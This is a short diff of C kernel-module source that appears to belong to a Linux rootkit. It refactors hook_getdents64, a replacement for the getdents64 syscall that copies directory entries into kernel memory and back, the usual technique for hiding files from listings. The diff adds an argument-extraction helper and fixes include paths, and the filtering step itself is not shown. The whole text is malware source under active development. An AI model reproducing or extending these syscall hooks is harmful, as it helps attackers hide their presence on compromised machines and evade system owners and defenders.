@@ -6,9 +6,22 @@
 // ////////////////////////////////////////////////////////////////////
 // ////////////////////////////////////////////////////////////////////
 
-#include "../../logger/logger.h"
-#include "../utils.h"
+#include "../../../logger/logger.h"
+#include "../../utils.h"
 #include "getdents64.h"
+
+// ////////////////////////////////////////////////////////////////////
+// ////////////////////////////////////////////////////////////////////
+
+struct getdents64_args explode_getdents64_args(const struct pt_regs *regs) {
+    const struct getdents64_args args = {
+        SYSCALL_ARG1(regs, unsigned int),
+       SYSCALL_ARG2(regs, struct linux_dirent64 __user *),
+       SYSCALL_ARG3(regs, unsigned int)
+   };
+
+    return args;
+}
 
 // ////////////////////////////////////////////////////////////////////
 // ////////////////////////////////////////////////////////////////////
@@ -18,7 +31,7 @@ asmlinkage long (*real_getdents64)(const struct pt_regs *);
 // ////////////////////////////////////////////////////////////////////
 
 asmlinkage long hook_getdents64(const struct pt_regs *regs) {
-    struct linux_dirent64 __user *user_dir = (void *)regs->si;
+    const struct getdents64_args args = explode_getdents64_args(regs);
 
     struct linux_dirent64
         *kernel_dir_buffer = NULL,
@@ -39,7 +52,7 @@ asmlinkage long hook_getdents64(const struct pt_regs *regs) {
         return -ENOMEM;
     }
 
-    if (copy_from_user(kernel_dir_buffer, user_dir, ret)) {
+    if (copy_from_user(kernel_dir_buffer, args.dirent, ret)) {
         kfree(kernel_dir_buffer);
         rk_err("[hook_getdents64] getdents64() failed to copy kernel buffer\n");
         return -EFAULT;
@@ -65,7 +78,7 @@ asmlinkage long hook_getdents64(const struct pt_regs *regs) {
         }
     }
 
-    if (copy_to_user(user_dir, kernel_dir_buffer, ret)) {
+    if (copy_to_user(args.dirent, kernel_dir_buffer, ret)) {
         kfree(kernel_dir_buffer);
         rk_err("[hook_getdents64] getdents64() failed to copy to user buffer\n");
         return -EFAULT;
